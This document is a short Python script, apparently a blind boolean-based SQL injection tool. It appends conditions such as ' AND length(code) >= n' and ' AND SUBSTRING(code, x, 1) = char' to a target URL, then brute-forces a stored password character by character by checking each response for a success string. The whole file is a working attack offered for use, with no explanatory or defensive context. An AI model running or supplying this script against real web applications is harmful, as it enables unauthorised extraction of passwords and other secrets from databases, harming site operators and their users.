import requests
import string
import sys
import time

def checkURL(url, strCheck):

    time.sleep(0.2)
    res = requests.get(url)

    if strCheck in res.text:
        return True
    return False


if len(sys.argv) != 3:
    print("Usage :", sys.argv[0], '"<URL>"', '"<SUCCESS STRING>"')
    exit(1)

url = sys.argv[1]
msg = sys.argv[2]
col_name = "code"

found = True
password_size = 1
password_found = ''

print("[+] URL :", url)
print("[+] Checking password size...")

while found:
    found = False
    result = checkURL(url + f" AND length({col_name}) >= {password_size}", msg)
    
    if result:
        print("[+] Password size : ", password_size, end="\r")
        password_size += 1
        found = True


charset = string.printable

print("\n[+] Retrieving password ...")

for x in range(1, password_size + 1):
    found = False

    for char in charset:
        param = f" AND SUBSTRING({col_name}, {x}, 1) = '{char}'"
        result = checkURL(url + param, msg)
        print("[+] Retrieving password :", password_found + char, end="\r")

        if result:
            found = True
            password_found += char
            print("[+] Retrieving password :", password_found, end="\r")
            break

print("\n[+] Password found :", password_found)
